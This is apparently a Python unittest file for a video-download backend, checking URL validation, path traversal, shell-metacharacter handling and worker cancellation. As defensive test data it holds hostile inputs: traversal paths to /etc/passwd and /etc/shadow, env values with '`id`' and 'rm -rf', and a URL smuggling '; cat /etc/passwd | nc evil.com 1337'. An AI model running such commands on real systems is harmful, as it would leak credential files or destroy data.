import os
import asyncio
import unittest
from unittest.mock import patch, MagicMock, AsyncMock

os.environ["AUTH_DISABLED"] = "true"

from backend import main
from backend.main import (
    get_media_dir,
    download_worker,
    process_queue,
    is_valid_tiktok_url,
    is_valid_youtube_url,
    is_valid_media_url,
)


class TestAdversarialRoutingAndSecurity(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        main.queue = asyncio.Queue()
        main.state_lock = asyncio.Lock()
        main.queued_tasks = []
        main.history = []
        main.current_task = None
        main.active_process = None

    async def asyncTearDown(self):
        tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        for t in tasks:
            t.cancel()
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def _run_worker_once(self, task: dict):
        mock_proc = MagicMock()
        mock_proc.stdout.readline = AsyncMock(return_value=b"")
        mock_proc.wait = AsyncMock(return_value=0)
        mock_proc.returncode = 0

        with patch("asyncio.create_subprocess_exec", new=AsyncMock(return_value=mock_proc)) as mock_exec, \
             patch("os.makedirs") as mock_makedirs:
            await main.queue.put(task)
            worker = asyncio.create_task(download_worker())
            await main.queue.join()
            worker.cancel()
            try:
                await worker
            except asyncio.CancelledError:
                pass
            return mock_exec, mock_makedirs

    # -------------------------------------------------------------------------
    # 1. Pathological URL tests & Protocol Validation
    # -------------------------------------------------------------------------
    def test_invalid_protocols_fail_tiktok_validation(self):
        malicious_urls = [
            "ftp://tiktok.com/@attacker/video/123",
            "file:///etc/passwd",
            "javascript:alert(1)//tiktok.com/@evil",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "smb://tiktok.com/@attacker/video/123",
            "gopher://tiktok.com/@attacker/video/123",
        ]
        for url in malicious_urls:
            with self.subTest(url=url):
                self.assertFalse(is_valid_tiktok_url(url))
                self.assertFalse(is_valid_media_url(url))
                # get_media_dir falls back safely to YouTube media dir
                self.assertEqual(get_media_dir(url), "/app/media")

    def test_path_traversal_in_url_does_not_affect_media_dir(self):
        traversal_urls = [
            "https://www.tiktok.com/../../../../etc/passwd",
            "https://www.tiktok.com/@creator/../../media/evil",
            "https://www.youtube.com/watch?v=../../../etc/shadow",
        ]
        for url in traversal_urls:
            with self.subTest(url=url):
                dir_path = get_media_dir(url)
                # Ensure no traversal sequence leaked into directory path
                self.assertNotIn("..", dir_path)
                self.assertNotIn("passwd", dir_path)
                self.assertNotIn("shadow", dir_path)

    def test_query_params_and_fragments_tiktok(self):
        complex_urls = [
            "https://www.tiktok.com/@user/video/12345?is_from_webapp=1&sender_device=pc#top",
            "https://m.tiktok.com/v/12345.html?foo=bar",
            "https://vt.tiktok.com/ZS12345/?utm_source=share",
        ]
        for url in complex_urls:
            with self.subTest(url=url):
                self.assertTrue(is_valid_tiktok_url(url))
                self.assertEqual(get_media_dir(url), "/app/media/tiktok")

    # -------------------------------------------------------------------------
    # 2. Environment Variable Injection & Shell Metacharacters
    # -------------------------------------------------------------------------
    def test_env_var_with_spaces_and_special_chars(self):
        with patch.dict(os.environ, {
            "MEDIA_DIR": "/var/media pool with spaces",
            "TIKTOK_MEDIA_DIR": "/var/media pool with spaces/tt $SHELL `id` ;",
            "YOUTUBE_MEDIA_DIR": "/var/media pool with spaces/yt & rm -rf",
        }):
            tt_dir = get_media_dir("https://www.tiktok.com/@user/video/1")
            yt_dir = get_media_dir("https://www.youtube.com/watch?v=1")
            self.assertEqual(tt_dir, "/var/media pool with spaces/tt $SHELL `id` ;")
            self.assertEqual(yt_dir, "/var/media pool with spaces/yt & rm -rf")

    async def test_command_injection_prevention_in_worker(self):
        # Even if environment variable or URL contains shell injection payloads,
        # create_subprocess_exec receives an argv list, not a shell string.
        payload_dir = "/app/media/$(whoami); touch /tmp/pwned"
        with patch.dict(os.environ, {"TIKTOK_MEDIA_DIR": payload_dir}):
            task = {
                "id": "task_adversarial_1",
                "url": "https://www.tiktok.com/@user/video/123; cat /etc/passwd | nc evil.com 1337",
                "metadata_fetched": True,
                "cancelled": False,
            }
            mock_exec, mock_makedirs = await self._run_worker_once(task)
            
            mock_makedirs.assert_called_with(payload_dir, exist_ok=True)
            self.assertTrue(mock_exec.called)
            cmd = mock_exec.call_args[0]
            # Ensure it is passed as individual arguments to execve
            self.assertEqual(cmd[0], "yt-dlp")
            o_index = cmd.index("-o")
            self.assertTrue(cmd[o_index + 1].startswith(payload_dir))
            # The malicious URL is the last element and unmodified/un-split
            self.assertEqual(cmd[-1], task["url"])

    # -------------------------------------------------------------------------
    # 3. Cancellation and Error Handling Integrity
    # -------------------------------------------------------------------------
    async def test_worker_cancellation_during_execution(self):
        proc_terminated = asyncio.Event()
        mock_proc = MagicMock()
        mock_proc.returncode = None
        def do_terminate():
            mock_proc.returncode = -15
            proc_terminated.set()
        mock_proc.terminate = MagicMock(side_effect=do_terminate)
        async def mock_wait():
            await proc_terminated.wait()
            return -15
        mock_proc.wait = AsyncMock(side_effect=mock_wait)

        # Simulates a slow readline that can be cancelled
        async def slow_readline():
            await proc_terminated.wait()
            return b""
        mock_proc.stdout.readline = slow_readline

        task = {
            "id": "task_cancel_test",
            "url": "https://www.tiktok.com/@user/video/999",
            "metadata_fetched": True,
            "cancelled": False,
        }

        with patch("asyncio.create_subprocess_exec", new=AsyncMock(return_value=mock_proc)), \
             patch("os.makedirs"):
            await main.queue.put(task)
            worker = asyncio.create_task(download_worker())
            
            # Let worker pick up task and launch process
            while main.active_process is None:
                await asyncio.sleep(0.01)
            
            # Cancel the task via API logic: mark cancelled and terminate active_process
            task["cancelled"] = True
            if main.active_process:
                main.active_process.terminate()
            
            # Wait for task queue to finish
            await main.queue.join()
            worker.cancel()
            try:
                await worker
            except asyncio.CancelledError:
                pass

            mock_proc.terminate.assert_called()
            self.assertEqual(task["status"], "cancelled")

    async def test_worker_exception_handling(self):
        # Simulate os.makedirs throwing PermissionError
        task = {
            "id": "task_err_test",
            "url": "https://www.tiktok.com/@user/video/888",
            "metadata_fetched": True,
            "cancelled": False,
        }
        with patch("os.makedirs", side_effect=PermissionError("Permission denied: /app/media/tiktok")):
            await main.queue.put(task)
            worker = asyncio.create_task(download_worker())
            await main.queue.join()
            worker.cancel()
            try:
                await worker
            except asyncio.CancelledError:
                pass

            self.assertEqual(task["status"], "failed")
            self.assertIn("Permission denied", task["error"])
            self.assertIn(task, main.history)
            self.assertIsNone(main.current_task)
            self.assertIsNone(main.active_process)
